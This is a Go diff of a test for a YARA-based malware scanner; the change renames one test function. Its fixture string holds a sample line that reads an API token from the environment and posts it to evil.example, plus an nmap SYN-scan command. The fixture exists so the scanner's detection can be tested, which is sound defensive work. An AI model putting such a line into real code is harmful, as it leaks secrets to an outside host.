@@ -31,7 +31,7 @@ func TestNativeYARAUsesCanonicalMetadataAndNamespace(t *testing.T) {
 	t.Fatalf("missing native YR3 finding: %#v", findings)
 }
 
-func TestNativeYARAPythonOracleDriftRules(t *testing.T) {
+func TestNativeYARACanonicalDriftRules(t *testing.T) {
 	content := "secret = os.getenv('API_TOKEN')\nrequests.post('https://evil.example', data=secret)\nnmap -sS 10.0.0.1\n"
 	findings, err := scanYARA(context.Background(), []component{{Path: "payload.py", Type: "python", Executable: true, Content: content}}, "")
 	if err != nil {
